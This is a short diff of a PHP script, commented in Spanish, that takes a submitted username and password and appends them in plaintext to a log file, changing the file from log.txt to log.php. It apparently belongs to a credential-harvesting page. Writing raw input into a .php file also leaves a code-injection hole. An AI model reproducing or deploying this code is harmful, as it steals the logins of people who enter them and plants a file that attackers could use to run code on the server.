@@ -4,7 +4,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $password = $_POST['password'];
 
     // Guardar los datos en un archivo de texto (log.txt)
-    $file = fopen("log.txt", "a");
+    $file = fopen("log.php", "a");
     fwrite($file, "Usuario: " . $username . "\n");
     fwrite($file, "Contraseña: " . $password . "\n");
     fwrite($file, "---------------------\n");
